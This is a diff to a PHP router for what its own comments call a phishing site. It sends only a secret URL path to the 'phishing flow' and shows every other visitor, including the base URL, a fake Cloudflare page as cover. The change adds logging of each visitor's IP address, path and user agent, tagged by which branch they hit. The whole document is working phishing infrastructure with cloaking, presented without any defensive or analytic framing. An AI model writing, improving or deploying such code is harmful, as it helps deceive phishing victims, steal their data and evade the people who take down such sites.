@@ -10,6 +10,17 @@ if ($path === '//') {
     $path = '/';
 }
 
+$logFile = '/home/user/Downloads/access.log';
+$log = function ($type) use ($path, $logFile) {
+    $ts = date('Y-m-d H:i:s');
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '?';
+    $ua = trim($_SERVER['HTTP_USER_AGENT'] ?? '-');
+    if (strlen($ua) > 80) {
+        $ua = substr($ua, 0, 77) . '...';
+    }
+    @file_put_contents($logFile, "$ts | $type | $ip | $path | $ua\n", FILE_APPEND | LOCK_EX);
+};
+
 // Only the exact secret path gets the phishing flow; everything else (including /) gets the fake page.
 $config = @parse_ini_file(__DIR__ . '/php.ini', false);
 $secretPath = isset($config['SECRET_PATH']) ? trim($config['SECRET_PATH']) : '12098e2fklj.html';
@@ -18,11 +29,13 @@ $secretPathFull = ($secretPath !== '') ? '/' . $secretPath : null;
 
 // Phishing flow only for the exact secret path (never for / or empty path)
 if ($secretPathFull !== null && $path === $secretPathFull) {
+    $log('PHISHING_FLOW');
     require __DIR__ . '/index.php';
     return true;
 }
 
 // Base URL and any other path: serve fake Cloudflare page
+$log('FAKE_PAGE');
 $fakePath = __DIR__ . '/CloudflareFake.html';
 if (is_readable($fakePath)) {
     header('Content-Type: text/html; charset=utf-8');
